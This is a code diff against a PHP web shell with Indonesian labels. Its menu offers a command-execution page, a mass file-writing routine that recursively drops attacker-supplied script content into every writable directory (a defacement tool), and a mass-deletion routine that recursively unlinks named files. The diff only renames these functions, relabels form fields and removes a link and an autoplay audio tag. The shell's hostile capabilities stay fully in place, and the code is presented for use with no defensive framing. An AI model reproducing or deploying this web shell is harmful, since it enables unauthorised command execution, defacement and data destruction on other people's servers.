@@ -166,7 +166,7 @@ echo "</td></tr>";
 echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
-echo "<a class='destroy_table' href='?'>Home</a>";
+// echo "<a class='destroy_table' href='?'>Home</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4phy'>Gasspoll!</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=z4p'>Gasskeun!!</a><br>";
@@ -174,7 +174,7 @@ echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "</center>";
 
 if($_GET['to'] == 'z4phy') {
-	function sabun_massal($dir,$namafile,$isi_script) {
+	function sabun_eperiting($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
 			foreach($dira as $dirb) {
@@ -189,7 +189,7 @@ if($_GET['to'] == 'z4phy') {
 						if(is_writable($dirc)) {
 							echo "[<font color=lime>DONE</font>] $lokasi<br>";
 							file_put_contents($lokasi, $isi_script);
-							$idx = sabun_massal($dirc,$namafile,$isi_script);
+							$idx = sabun_eperiting($dirc,$namafile,$isi_script);
 						}
 					}
 				}
@@ -220,7 +220,7 @@ if($_GET['to'] == 'z4phy') {
 	if($_POST['mulaiz4p']) {
 		if($_POST['tipe_sabun'] == 'mahal') {
 			echo "<div style='margin: 5px auto; padding: 5px'>";
-			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			sabun_eperiting($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
 			echo "</div>";
 		} elseif($_POST['tipe_sabun'] == 'murah') {
 			echo "<div style='margin: 5px auto; padding: 5px'>";
@@ -230,8 +230,8 @@ if($_GET['to'] == 'z4phy') {
 	} else {
 	echo "<center>";
 	echo "<form method='post'>
-	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
-	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+	<font style='text-decoration: underline;'>Tipe Nya:</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>eperiting<br>
 	<font style='text-decoration: underline;'>Folder:</font><br>
 	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
 	<font style='text-decoration: underline;'>Filename:</font><br>
@@ -242,7 +242,7 @@ if($_GET['to'] == 'z4phy') {
 	</form></center>";
 	} 
 	} elseif($_GET['to'] == 'z4p') {
-   function hapus_massal($dir,$namafile) {
+   function hapus_eperiting($dir,$namafile) {
 if(is_writable($dir)) {
    $dira = scandir($dir);
    foreach($dira as $dirb) {
@@ -262,7 +262,7 @@ if(is_writable($dir)) {
                    if(file_exists($lokasi)) {
                        echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                        unlink($lokasi);
-                       $idx = hapus_massal($dirc,$namafile);
+                       $idx = hapus_eperiting($dirc,$namafile);
                    }
                }
            }
@@ -272,7 +272,7 @@ if(is_writable($dir)) {
    }
    if($_POST['mulaiz4p']) {
 echo "<div style='margin: 5px auto; padding: 5px'>";
-hapus_massal($_POST['d_dir'], $_POST['d_file']);
+hapus_eperiting($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
    } else {
    echo "<center>";
@@ -443,7 +443,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><audio autoplay="autoplay" controls="controls" src="https://h.top4top.io/m_16378jw0k0.m3" type="audio/mpeg"></audio></center>
+echo '
 </body>
 </html>';
 function perms($file){
